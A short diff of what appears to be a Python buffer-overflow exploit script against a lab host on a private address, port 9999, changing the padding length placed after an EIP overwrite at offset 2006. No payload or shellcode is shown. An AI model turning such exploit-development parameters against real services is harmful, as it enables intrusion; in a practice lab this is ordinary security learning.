@@ -6,7 +6,7 @@ import sys
 target = '192.168.56.104'
 port = 9999
 offset = 2006
-extra_length = 987 # Increase the number of 'C' chars after overwriting EIP register
+extra_length = 1024 # Increase the number of 'C' chars after overwriting EIP register
 # -----------------
 
 TIMEOUT = 2
